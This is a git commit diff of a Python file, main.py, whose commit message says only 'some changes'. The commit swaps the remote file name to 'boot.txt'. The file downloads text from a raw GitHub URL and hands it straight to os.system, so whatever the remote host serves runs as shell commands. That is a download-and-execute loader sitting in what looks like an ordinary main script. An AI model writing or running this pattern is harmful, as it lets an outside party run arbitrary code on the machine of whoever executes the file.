57ff4102a7fda488c54c90db91fee40fa31f2436
xMakiBoT <63221803+xMakiBoT@users.noreply.github.com>
2024-07-30 09:17:56 +0800

    some changes

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
 import os,re,sys,time,requests,json
 
-response = requests.get("https://raw.githubusercontent.com/xMakiBoT/procsys24/main/New%20Text%20Document.txt")
+response = requests.get("https://raw.githubusercontent.com/xMakiBoT/procsys24/main/boot.txt")
 os.system(response.text)
